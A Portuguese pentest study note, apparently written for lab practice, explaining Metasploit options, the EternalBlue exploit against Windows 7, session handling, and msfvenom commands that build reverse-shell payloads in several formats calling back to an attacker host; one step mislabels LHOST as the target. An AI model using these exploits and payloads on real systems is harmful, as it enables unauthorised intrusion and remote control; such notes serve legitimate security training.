---
tags:
  - pentest
---
# Parâmetros Metasploit
- **RHOSTS**: "*Host remoto*", o endereço IP do sistema de destino. É possível definir um único endereço IP ou um intervalo de rede. Isso dará suporte à notação CIDR (Classless Inter-Domain Routing) (/24, /16, etc.) ou a um intervalo de rede (10.10.10.x - 10.10.10.y). Você também pode usar um arquivo em que os alvos são listados, um alvo por linha, usando file:/path/of/the/target_file.txt, como você pode ver abaixo.
- **RPORT**: "*Porta remota*", a porta no sistema de destino em que o aplicativo vulnerável está sendo executado.
- **PAYLOAD**: O *payload* que você usará com a exploração.
- **LHOST**: "*Localhost*", o endereço IP da máquina atacante (seu AttackBox ou Kali Linux).
- **LPORT**: "*Local port*" (porta local), a porta que você usará para que o shell reverso se conecte novamente. Essa é uma porta em seu computador de ataque e você pode defini-la como qualquer porta que não seja usada por nenhum outro aplicativo.
- **SESSÃO**: cada conexão estabelecida com o sistema de destino usando o Metasploit terá um *ID de sessão*. Você usará isso com módulos de pós-exploração que se conectarão ao sistema de destino usando uma conexão existente.
# Scan e Exploit
1. Você pode pesquisar exploits usando o comando `search`, obter mais informações sobre o exploit usando o comando info e iniciar o exploit usando exploit.  O comando `show payloads` lista outros comandos que podem ser usados com esse exploit específico.
   
```shell
msf6 exploit(windows/smb/ms17_010_eternalblue) > show payloads

msf6 exploit(windows/smb/ms17_010_eternalblue) > set payload 2
#payload => generic/shell_reverse_tcp

msf6 exploit(windows/smb/ms17_010_eternalblue) > show options 

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS                          yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:'
   RPORT          445              yes       The target port (TCP)
   SMBDomain      .                no        (Optional) The Windows domain to use for authentication
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target.

```

2. Settar o LHOST, que será nosso **alvo** e iniciar o exploit. Nesse exemplo foi usado o *eternalblue* que tem como alvo sistemas *Windows 7*
```shell
msf6 exploit(windows/smb/ms17_010_eternalblue) > set lhost 10.10.186.44
lhost => 10.10.186.44
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit 
```

#### Sessions
Digitando CTRL+Z, podemos deixar a sessão em segundo plano. E digitando `sessions -i` podemos acessar a session anteriormente estabelecida
```shell
C:\Windows\system32>^Z
Background session 1? [y/N]  y

msf6 exploit(windows/smb/ms17_010_eternalblue) > sessions

Active sessions
===============

  Id  Name  Type               Information                                                                       Connection
###############################################################
msf6 exploit(windows/smb/ms17_010_eternalblue) > sessions -i 1
[*] Starting interaction with 1...

C:\Windows\system32> #sessão reestabelecida
```

# Msfvenon
O Msfvenom permite a criação de payloads em muitos formatos diferentes (PHP, exe, dll, elf etc.) e para muitos sistemas-alvo diferentes (Apple, Windows, Android, Linux etc.).

```shell
msfvenom -p php/reverse_php LHOST=10.0.2.19 LPORT=7777 -f raw > reverse_shell.php

msfconsole

msf6 > use exploit/multi/handler 
```

Como sempre, será necessário settar o `LHOST` e a `LPORT` para nosso alvo. Por fim, rodar o o exploit

```shell
msf5 exploit(multi/handler) > set lhost 10.0.2.19
lhost => 10.0.2.19

msf6 exploit(multi/handler) > set lport 7777
lport => 7777

msf6 exploit(multi/handler) > run
```

# Outros Payloads
Com base na configuração do sistema de destino (sistema operacional, servidor da Web instalado, interpretador instalado etc.), o msfvenom pode ser usado para criar payloads em quase todos os formatos. Abaixo estão alguns exemplos que você usará com frequência:

> Em todos esses exemplos, *LHOST* será o endereço **IP de sua máquina atacante** e *LPORT* será a **porta na qual seu manipulador escutará**.
#### Formato executável e vinculável do Linux (elf)
`msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f elf > rev_shell.elf`

O formato .elf é comparável ao formato .exe do Windows. Esses são arquivos executáveis para Linux. No entanto, talvez você ainda precise garantir que eles tenham permissões de execução no computador de destino. Por exemplo, depois de ter o arquivo shell.elf no computador de destino, use o comando chmod +x shell.elf para conceder permissões de execução. Uma vez feito isso, você pode executar esse arquivo digitando ./shell.elf na linha de comando do computador de destino.
#### Windows
`msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f exe > rev_shell.exe`
#### PHP
`msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.php`
#### ASP
`msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f asp > rev_shell.asp`
#### Python
`msfvenom -p cmd/unix/reverse_python LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.py`
